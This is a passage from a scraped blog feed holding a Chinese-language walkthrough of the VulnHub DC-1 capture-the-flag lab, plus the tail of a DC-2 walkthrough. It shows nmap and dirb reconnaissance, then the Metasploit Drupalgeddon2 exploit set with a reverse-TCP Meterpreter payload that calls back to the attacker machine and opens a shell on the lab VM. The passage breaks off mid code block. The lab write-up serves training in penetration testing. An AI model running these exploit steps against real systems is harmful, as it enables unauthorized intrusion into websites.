__/\_/ </span></span><br><span class="line"><span class="string">  \/  \/ \___|_|_|  \__,_|\___/|_| |_|\___\/   </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Congratulatons!!!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">A special thanks to all those who sent me tweets</span></span><br><span class="line"><span class="string">and provided me with feedback - it&#x27;</span>s all greatly</span><br><span class="line">appreciated.</span><br><span class="line"></span><br><span class="line">If you enjoyed this CTF, send me a tweet via @DCAU7.</span><br><span class="line"></span><br><span class="line">root@DC-2:~<span class="comment"># </span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x00-官网描述&quot;&gt;&lt;a href=&quot;#0x00-官网描述&quot; class=&quot;headerlink&quot; title=&quot;0x00.官网描述&quot;&gt;&lt;/a&gt;0x00.官网描述&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;Much like DC-1, DC-2 is another purposely built vulnerable lab for the purpose of gaining experience in the world of penetration testing.&lt;/p&gt;
&lt;p&gt;As with the original DC-1, it’s designed with beginners in mind.&lt;/p&gt;
&lt;p&gt;Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.&lt;/p&gt;
&lt;p&gt;Just like with DC-1, there are five flags including the final flag.&lt;/p&gt;
&lt;p&gt;And again, just like with DC-1, the flags are important for beginners, but not so important for those who have experience.&lt;/p&gt;
&lt;p&gt;In short, the only flag that really counts, is the final flag.&lt;/p&gt;
&lt;p&gt;For beginners, Google is your friend. Well, apart from all the privacy concerns etc etc.&lt;/p&gt;
&lt;p&gt;I haven’t explored all the ways to achieve root, as I scrapped the previous version I had been working on, and started completely fresh apart from the base OS install.&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="vulnhub" scheme="https://lunamoore.github.io/categories/vulnhub/"/>
    
    
    <category term="靶机" scheme="https://lunamoore.github.io/tags/%E9%9D%B6%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>DC:1</title>
    <link href="https://lunamoore.github.io/2020/08/21/DC-1/"/>
    <id>https://lunamoore.github.io/2020/08/21/DC-1/</id>
    <published>2020-08-20T16:28:55.000Z</published>
    <updated>2020-08-21T06:51:45.271Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-官网描述"><a href="#0x00-官网描述" class="headerlink" title="0x00.官网描述"></a>0x00.官网描述</h2><blockquote><p>DC-1 is a purposely built vulnerable lab for the purpose of gaining experience in the world of penetration testing.</p><p>It was designed to be a challenge for beginners, but just how easy it is will depend on your skills and knowledge, and your ability to learn.</p><p>To successfully complete this challenge, you will require Linux skills, familiarity with the Linux command line and experience with basic penetration testing tools, such as the tools that can be found on Kali Linux, or Parrot Security OS.</p><p>There are multiple ways of gaining root, however, I have included some flags which contain clues for beginners.</p><p>There are five flags in total, but the ultimate goal is to find and read the flag in root’s home directory. You don’t even need to be root to do this, however, you will require root privileges.</p><p>Depending on your skill level, you may be able to skip finding most of these flags and go straight for root.</p><p>Beginners may encounter challenges that they have never come across previously, but a Google search should be all that is required to obtain the information required to complete this challenge.</p></blockquote><a id="more"></a><h2 id="0x01-上nmap"><a href="#0x01-上nmap" class="headerlink" title="0x01.上nmap"></a>0x01.上nmap</h2><p><code>可以发现1为网关，2为宿主机，6为kali，那么3就是我们的受害者</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC1<span class="comment"># nmap -sP 192.168.1.0/24 -oN nmap.sP</span></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-20 07:08 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.1</span><br><span class="line">Host is up (0.0019s latency).</span><br><span class="line">MAC Address: 68:D1:BA:1F:FD:48 (Shenzhen Youhua Technology)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.2</span><br><span class="line">Host is up (0.00027s latency).</span><br><span class="line">MAC Address: 50:5B:C2:8C:BE:A5 (Liteon Technology)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.3</span><br><span class="line">Host is up (0.00027s latency).</span><br><span class="line">MAC Address: 00:0C:29:45:E3:65 (VMware)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.6</span><br><span class="line">Host is up.</span><br><span class="line">Nmap <span class="keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="keyword">in</span> 2.08 seconds</span><br><span class="line">root@JIYE:~/tmp/DC1<span class="comment"># ls</span></span><br><span class="line">nmap.sP</span><br></pre></td></tr></table></figure><h2 id="0x02-继续nmap扫描服务及端口"><a href="#0x02-继续nmap扫描服务及端口" class="headerlink" title="0x02.继续nmap扫描服务及端口"></a>0x02.继续nmap扫描服务及端口</h2><p><code>可以发现开放了22/80/111/41087端口</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC1<span class="comment"># nmap -A 192.168.1.3 -p 1-65535 -oN nmap.A</span></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-20 07:19 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.3</span><br><span class="line">Host is up (0.00080s latency).</span><br><span class="line">Not shown: 65531 closed ports</span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">22/tcp    open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 c4:d6:59:e6:77:4c:22:7a:96:16:60:67:8b:42:48:8f (DSA)</span><br><span class="line">|   2048 11:82:fe:53:4e:dc:5b:32:7f:44:64:82:75:7d:d0:a0 (RSA)</span><br><span class="line">|_  256 3d:aa:98:5c:87:af:ea:84:b8:23:68:8d:b9:05:5f:d8 (ECDSA)</span><br><span class="line">80/tcp    open  http    Apache httpd 2.2.22 ((Debian))</span><br><span class="line">|_http-generator: Drupal 7 (http://drupal.org)</span><br><span class="line">| http-robots.txt: 36 disallowed entries (15 shown)</span><br><span class="line">| /includes/ /misc/ /modules/ /profiles/ /scripts/ </span><br><span class="line">| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt </span><br><span class="line">| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt </span><br><span class="line">|_/LICENSE.txt /MAINTAINERS.txt</span><br><span class="line">|_http-server-header: Apache/2.2.22 (Debian)</span><br><span class="line">|_http-title: Welcome to Drupal Site | Drupal Site</span><br><span class="line">111/tcp   open  rpcbind 2-4 (RPC <span class="comment">#100000)</span></span><br><span class="line">| rpcinfo: </span><br><span class="line">|   program version    port/proto  service</span><br><span class="line">|   100000  2,3,4        111/tcp   rpcbind</span><br><span class="line">|   100000  2,3,4        111/udp   rpcbind</span><br><span class="line">|   100000  3,4          111/tcp6  rpcbind</span><br><span class="line">|   100000  3,4          111/udp6  rpcbind</span><br><span class="line">|   100024  1          36531/tcp6  status</span><br><span class="line">|   100024  1          41087/tcp   status</span><br><span class="line">|   100024  1          48070/udp6  status</span><br><span class="line">|_  100024  1          50997/udp   status</span><br><span class="line">41087/tcp open  status  1 (RPC <span class="comment">#100024)</span></span><br><span class="line">MAC Address: 00:0C:29:45:E3:65 (VMware)</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running: Linux 3.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3</span><br><span class="line">OS details: Linux 3.2 - 3.16</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.80 ms 192.168.1.3</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 17.37 seconds</span><br></pre></td></tr></table></figure><h2 id="0x03-由于发现了22与80端口，可以考虑爆破或者访问一下"><a href="#0x03-由于发现了22与80端口，可以考虑爆破或者访问一下" class="headerlink" title="0x03.由于发现了22与80端口，可以考虑爆破或者访问一下"></a>0x03.由于发现了22与80端口，可以考虑爆破或者访问一下</h2><p><code>这里先访问一下</code></p><img src="/2020/08/21/DC-1/image-20200820192812864.png" class><p><code>感觉像一个cms，先wiki一下，果然这是一个由PHP写的开源cms😜</code></p><img src="/2020/08/21/DC-1/image-20200820193047316.png" class><h2 id="0x04-接下来可以对网站进行目录扫描"><a href="#0x04-接下来可以对网站进行目录扫描" class="headerlink" title="0x04.接下来可以对网站进行目录扫描"></a>0x04.接下来可以对网站进行目录扫描</h2><p><code>可以发现robots.txt，此文件用来防爬虫，文件内容一般为不想让人看到的</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC1<span class="comment"># dirb http://192.168.1.3 </span></span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Thu Aug 20 07:38:44 2020</span><br><span class="line">URL_BASE: http://192.168.1.3/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612                                                          </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://192.168.1.3/ ----</span><br><span class="line">+ http://192.168.1.3/0 (CODE:200|SIZE:7564)                           </span><br><span class="line">+ http://192.168.1.3/admin (CODE:403|SIZE:7652)                       </span><br><span class="line">+ http://192.168.1.3/Admin (CODE:403|SIZE:7497)                       </span><br><span class="line">+ http://192.168.1.3/ADMIN (CODE:403|SIZE:7497)                       </span><br><span class="line">+ http://192.168.1.3/batch (CODE:403|SIZE:7787)                         </span><br><span class="line">+ http://192.168.1.3/cgi-bin/ (CODE:403|SIZE:287)                       </span><br><span class="line">==&gt; DIRECTORY: http://192.168.1.3/includes/                             </span><br><span class="line">+ http://192.168.1.3/index.php (CODE:200|SIZE:7564)                     </span><br><span class="line">+ http://192.168.1.3/install.mysql (CODE:403|SIZE:292)                     </span><br><span class="line">+ http://192.168.1.3/install.pgsql (CODE:403|SIZE:292)                     </span><br><span class="line">+ http://192.168.1.3/LICENSE (CODE:200|SIZE:18092)                     </span><br><span class="line">==&gt; DIRECTORY: http://192.168.1.3/misc/                                 </span><br><span class="line">==&gt; DIRECTORY: http://192.168.1.3/modules/                             </span><br><span class="line">+ http://192.168.1.3/node (CODE:200|SIZE:7564)                         </span><br><span class="line">==&gt; DIRECTORY: http://192.168.1.3/profiles/                               </span><br><span class="line">+ http://192.168.1.3/README (CODE:200|SIZE:5376)                     </span><br><span class="line">+ http://192.168.1.3/robots (CODE:200|SIZE:1561)                       </span><br><span class="line">+ http://192.168.1.3/robots.txt (CODE:200|SIZE:1561)                     </span><br><span class="line">+ http://192.168.1.3/Root (CODE:403|SIZE:283)                           </span><br><span class="line">==&gt; DIRECTORY: http://192.168.1.3/scripts/                               </span><br><span class="line">+ http://192.168.1.3/search (CODE:403|SIZE:7500)                       </span><br><span class="line">+ http://192.168.1.3/Search (CODE:403|SIZE:7500)                       </span><br><span class="line">+ http://192.168.1.3/server-status (CODE:403|SIZE:292)                     </span><br><span class="line">==&gt; DIRECTORY: http://192.168.1.3/sites/                                 </span><br><span class="line">==&gt; DIRECTORY: http://192.168.1.3/themes/                               </span><br><span class="line">+ http://192.168.1.3/user (CODE:200|SIZE:7417)                         </span><br><span class="line">+ http://192.168.1.3/web.config (CODE:200|SIZE:2178)                     </span><br><span class="line">+ http://192.168.1.3/xmlrpc.php (CODE:200|SIZE:42)     </span><br><span class="line">......</span><br></pre></td></tr></table></figure><p><code>访问一下可以发现UPGRADE.txt</code></p><img src="/2020/08/21/DC-1/image-20200820200917231.png" class><p><code>访问UPGRADE.txt，可以发现此cms的版本为7.x</code></p><img src="/2020/08/21/DC-1/image-20200820201127217.png" class><p><code>百度一下发现存在RCE漏洞</code></p><img src="/2020/08/21/DC-1/image-20200820204120867.png" class><h2 id="0x05-get-shell"><a href="#0x05-get-shell" class="headerlink" title="0x05.get shell"></a>0x05.get shell</h2><h3 id="1-msf一把梭的我直接msf"><a href="#1-msf一把梭的我直接msf" class="headerlink" title="1.msf一把梭的我直接msf"></a>1.msf一把梭的我直接msf</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC1<span class="comment"># msfconsole -q</span></span><br><span class="line">msf5 &gt; search drupal</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   <span class="comment">#  Name                                           Disclosure Date  Rank       Check  Description</span></span><br><span class="line">   -  ----                                           ---------------  ----       -----  -----------</span><br><span class="line">   0  auxiliary/gather/drupal_openid_xxe             2012-10-17       normal     Yes    Drupal OpenID External Entity Injection</span><br><span class="line">   1  auxiliary/scanner/http/drupal_views_user_enum  2010-07-02       normal     Yes    Drupal Views Module Users Enumeration</span><br><span class="line">   2  exploit/multi/http/drupal_drupageddon          2014-10-15       excellent  No     Drupal HTTP Parameter Key/Value SQL Injection</span><br><span class="line">   3  exploit/unix/webapp/drupal_coder_exec          2016-07-13       excellent  Yes    Drupal CODER Module Remote Command Execution</span><br><span class="line">   4  exploit/unix/webapp/drupal_drupalgeddon2       2018-03-28       excellent  Yes    Drupal Drupalgeddon 2 Forms API Property Injection</span><br><span class="line">   5  exploit/unix/webapp/drupal_restws_exec         2016-07-13       excellent  Yes    Drupal RESTWS Module Remote PHP Code Execution</span><br><span class="line">   6  exploit/unix/webapp/drupal_restws_unserialize  2019-02-20       normal     Yes    Drupal RESTful Web Services unserialize() RCE</span><br><span class="line">   7  exploit/unix/webapp/php_xmlrpc_eval            2005-06-29       excellent  Yes    PHP XML-RPC Arbitrary Code Execution</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interact with a module by name or index, <span class="keyword">for</span> example use 7 or use exploit/unix/webapp/php_xmlrpc_eval</span><br><span class="line"></span><br><span class="line">msf5 &gt; </span><br></pre></td></tr></table></figure><h3 id="2-由于是18年的洞所以使用第四个API注入，直接拿到meterpreter-shell"><a href="#2-由于是18年的洞所以使用第四个API注入，直接拿到meterpreter-shell" class="headerlink" title="2.由于是18年的洞所以使用第四个API注入，直接拿到meterpreter shell"></a>2.由于是18年的洞所以使用第四个API注入，直接拿到meterpreter shell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/unix/webapp/drupal_drupalgeddon2</span><br><span class="line">[*] No payload configured, defaulting to php/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; </span><br><span class="line">msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; info</span><br><span class="line"></span><br><span class="line">       Name: Drupal Drupalgeddon 2 Forms API Property Injection</span><br><span class="line">     Module: exploit/unix/webapp/drupal_drupalgeddon2</span><br><span class="line">   Platform: PHP, Unix, Linux</span><br><span class="line">       Arch: php, cmd, x86, x64</span><br><span class="line"> Privileged: No</span><br><span class="line">    License: Metasploit Framework License (BSD)</span><br><span class="line">       Rank: Excellent</span><br><span class="line">  Disclosed: 2018-03-28</span><br><span class="line"></span><br><span class="line">Provided by:</span><br><span class="line">  Jasper Mattsson</span><br><span class="line">  a2u</span><br><span class="line">  Nixawk</span><br><span class="line">  FireFart</span><br><span class="line">  wvu &lt;wvu@metasploit.com&gt;</span><br><span class="line"></span><br><span class="line">Available targets:</span><br><span class="line">  Id  Name</span><br><span class="line">  --  ----</span><br><span class="line">  0   Automatic (PHP In-Memory)</span><br><span class="line">  1   Automatic (PHP Dropper)</span><br><span class="line">  2   Automatic (Unix In-Memory)</span><br><span class="line">  3   Automatic (Linux Dropper)</span><br><span class="line">  4   Drupal 7.x (PHP In-Memory)</span><br><span class="line">  5   Drupal 7.x (PHP Dropper)</span><br><span class="line">  6   Drupal 7.x (Unix In-Memory)</span><br><span class="line">  7   Drupal 7.x (Linux Dropper)</span><br><span class="line">  8   Drupal 8.x (PHP In-Memory)</span><br><span class="line">  9   Drupal 8.x (PHP Dropper)</span><br><span class="line">  10  Drupal 8.x (Unix In-Memory)</span><br><span class="line">  11  Drupal 8.x (Linux Dropper)</span><br><span class="line"></span><br><span class="line">Check supported:</span><br><span class="line">  Yes</span><br><span class="line"></span><br><span class="line">Basic options:</span><br><span class="line">  Name         Current Setting  Required  Description</span><br><span class="line">  ----         ---------------  --------  -----------</span><br><span class="line">  DUMP_OUTPUT  <span class="literal">false</span>            no        Dump payload <span class="built_in">command</span> output</span><br><span class="line">  PHP_FUNC     passthru         yes       PHP <span class="keyword">function</span> to execute</span><br><span class="line">  Proxies                       no        A proxy chain of format <span class="built_in">type</span>:host:port[,<span class="built_in">type</span>:host:port][...]</span><br><span class="line">  RHOSTS                        yes       The target host(s), range CIDR identifier, or hosts file with syntax <span class="string">&#x27;file:&lt;path&gt;&#x27;</span></span><br><span class="line">  RPORT        80               yes       The target port (TCP)</span><br><span class="line">  SSL          <span class="literal">false</span>            no        Negotiate SSL/TLS <span class="keyword">for</span> outgoing connections</span><br><span class="line">  TARGETURI    /                yes       Path to Drupal install</span><br><span class="line">  VHOST                         no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line">Payload information:</span><br><span class="line">  Avoid: 3 characters</span><br><span class="line"></span><br><span class="line">Description:</span><br><span class="line">  This module exploits a Drupal property injection <span class="keyword">in</span> the Forms API. </span><br><span class="line">  Drupal 6.x, &lt; 7.58, 8.2.x, &lt; 8.3.9, &lt; 8.4.6, and &lt; 8.5.1 are </span><br><span class="line">  vulnerable.</span><br><span class="line"></span><br><span class="line">References:</span><br><span class="line">  https://cvedetails.com/cve/CVE-2018-7600/</span><br><span class="line">  https://www.drupal.org/sa-core-2018-002</span><br><span class="line">  https://greysec.net/showthread.php?tid=2912</span><br><span class="line">  https://research.checkpoint.com/uncovering-drupalgeddon-2/</span><br><span class="line">  https://github.com/a2u/CVE-2018-7600</span><br><span class="line">  https://github.com/nixawk/labs/issues/19</span><br><span class="line">  https://github.com/FireFart/CVE-2018-7600</span><br><span class="line"></span><br><span class="line">Also known as:</span><br><span class="line">  SA-CORE-2018-002</span><br><span class="line">  Drupalgeddon 2</span><br><span class="line"></span><br><span class="line">msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; options </span><br><span class="line"></span><br><span class="line">Module options (exploit/unix/webapp/drupal_drupalgeddon2):</span><br><span class="line"></span><br><span class="line">   Name         Current Setting  Required  Description</span><br><span class="line">   ----         ---------------  --------  -----------</span><br><span class="line">   DUMP_OUTPUT  <span class="literal">false</span>            no        Dump payload <span class="built_in">command</span> output</span><br><span class="line">   PHP_FUNC     passthru         yes       PHP <span class="keyword">function</span> to execute</span><br><span class="line">   Proxies                       no        A proxy chain of format <span class="built_in">type</span>:host:port[,<span class="built_in">type</span>:host:port][...]</span><br><span class="line">   RHOSTS                        yes       The target host(s), range CIDR identifier, or hosts file with syntax <span class="string">&#x27;file:&lt;path&gt;&#x27;</span></span><br><span class="line">   RPORT        80               yes       The target port (TCP)</span><br><span class="line">   SSL          <span class="literal">false</span>            no        Negotiate SSL/TLS <span class="keyword">for</span> outgoing connections</span><br><span class="line">   TARGETURI    /                yes       Path to Drupal install</span><br><span class="line">   VHOST                         no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (php/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST  192.168.1.6      yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic (PHP In-Memory)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; <span class="built_in">set</span> rhosts 192.168.1.3</span><br><span class="line">rhosts =&gt; 192.168.1.3</span><br><span class="line">msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; <span class="built_in">set</span> lhost 192.168.1.6</span><br><span class="line">lhost =&gt; 192.168.1.6</span><br><span class="line">msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; <span class="built_in">set</span> payload </span><br><span class="line"><span class="built_in">set</span> payload generic/custom                      <span class="built_in">set</span> payload php/bind_php                        <span class="built_in">set</span> payload php/meterpreter/bind_tcp_uuid</span><br><span class="line"><span class="built_in">set</span> payload generic/shell_bind_tcp              <span class="built_in">set</span> payload php/bind_php_ipv6                   <span class="built_in">set</span> payload php/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> payload generic/shell_reverse_tcp           <span class="built_in">set</span> payload php/download_exec                   <span class="built_in">set</span> payload php/meterpreter/reverse_tcp_uuid</span><br><span class="line"><span class="built_in">set</span> payload multi/meterpreter/reverse_http      <span class="built_in">set</span> payload php/<span class="built_in">exec</span>                            <span class="built_in">set</span> payload php/meterpreter_reverse_tcp</span><br><span class="line"><span class="built_in">set</span> payload multi/meterpreter/reverse_https     <span class="built_in">set</span> payload php/meterpreter/bind_tcp            <span class="built_in">set</span> payload php/reverse_perl</span><br><span class="line"><span class="built_in">set</span> payload php/bind_perl                       <span class="built_in">set</span> payload php/meterpreter/bind_tcp_ipv6       <span class="built_in">set</span> payload php/reverse_php</span><br><span class="line"><span class="built_in">set</span> payload php/bind_perl_ipv6                  <span class="built_in">set</span> payload php/meterpreter/bind_tcp_ipv6_uuid  </span><br><span class="line">msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; <span class="built_in">set</span> payload php/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; php/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.1.6:4444 </span><br><span class="line">[*] Sending stage (38288 bytes) to 192.168.1.3</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.1.6:4444 -&gt; 192.168.1.3:52082) at 2020-08-20 08:50:40 -0400</span><br><span class="line"></span><br><span class="line">meterpreter &gt; </span><br></pre></td></tr></table></figure><h3 id="3-查看用户权限，并尝试提权，霸特，竟然没有getsystem🙃"><a href="#3-查看用户权限，并尝试提权，霸特，竟然没有getsystem🙃" class="headerlink" title="3.查看用户权限，并尝试提权，霸特，竟然没有getsystem🙃"></a>3.查看用户权限，并尝试提权，霸特，竟然没有getsystem🙃</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getuid </span><br><span class="line">Server username: www-data (33)</span><br><span class="line">meterpreter &gt; getsystem</span><br><span class="line">[-] Unknown <span class="built_in">command</span>: getsystem.</span><br><span class="line">meterpreter &gt; </span><br></pre></td></tr></table></figure><p><code>由于要找到5个flag所以还是先查看一下文件</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span 